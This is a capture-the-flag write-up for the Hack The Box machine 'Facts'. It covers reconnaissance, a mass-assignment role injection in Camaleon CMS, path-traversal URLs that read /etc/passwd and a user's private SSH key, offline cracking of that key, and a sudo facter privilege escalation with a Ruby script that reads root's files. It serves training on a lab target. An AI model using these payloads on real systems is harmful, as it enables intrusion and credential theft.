# Facts HTB Write-up

## Enumeration

### Port Scanning

First, I started with an Nmap scan to identify open ports and services:

Bash

```
nmap -sV -sC facts.htb
```

The scan shows that **HTTP (80)** and **SSH (22)** are open. Let's explore the web server.

### Directory Fuzzing

I used `gobuster` to find hidden directories:

Bash

```
gobuster dir -u http://facts.htb/ -w common.txt
```

The most interesting result was `/admin`, which redirects to the admin login dashboard.

---

## Exploitation

### Administrative Access (Role Injection)

On the login page, I found that I could create a new account. After logging in, I had limited access as a "Client." I identified that the site uses **Camaleon CMS v2.9.0**.

Researching this version led me to a **Mass Assignment** vulnerability. I was able to inject the `role` attribute during a password update request: `newpassword&password[role]=admin`

After sending this, my account was upgraded to **Admin**.

### Local File Inclusion (LFI)

While exploring the admin panel, I found another vulnerability ([GHSA-cp65-5m9r-vc2c](https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c)). The `download_private_file` endpoint is vulnerable to LFI.

I checked `/etc/passwd` to find valid users: `http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd`

I identified a user named **trivia**.

### SSH Key Extraction & Cracking

I attempted to dump the private SSH keys for the user `trivia`: `https://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519`

I successfully obtained the private key. However, the key was encrypted. I used `ssh2john` to convert it into a crackable format:

Bash

```
python3 ssh2john.py id_ed25519 > id_ed25519.hash
```

Then, I used **John the Ripper** with the `rockyou.txt` wordlist:

Bash

```
john --wordlist=rockyou.txt id_ed25519.hash
```

The password was cracked: **`dragonballz`**.

---

## Foothold

I logged in via SSH using the key and the cracked passphrase:

Bash

```
ssh trivia@facts.htb -i id_ed25519
```

The `user.txt` flag was not in the current home directory. I searched for it using:

Bash

```
find / -name user.txt 2>/dev/null
```

It was located in `/home/william/user.txt`. **User Flag:** `[HIDDEN]`

---

## Privilege Escalation

### Sudo Rights

I checked for sudo permissions:

Bash

```
sudo -l
```

The user can run `/usr/bin/facter` as sudo.

### Exploiting Facter (Ruby Load Path)

According to [GTFOBins](https://www.google.com/search?q=https://gtfobins.github.io/gtfobins/facter/), `facter` can load custom Ruby scripts from a specified directory. I created a malicious Ruby script in `/tmp`:

Ruby

```
# /tmp/exploit.rb
puts File.read("/root/root.txt")
```

Then, I executed `facter` pointing to that directory:

Bash

```
sudo /usr/bin/facter --custom-dir=/tmp x
```

The command executed my script with root privileges and printed the flag. **Root Flag:**
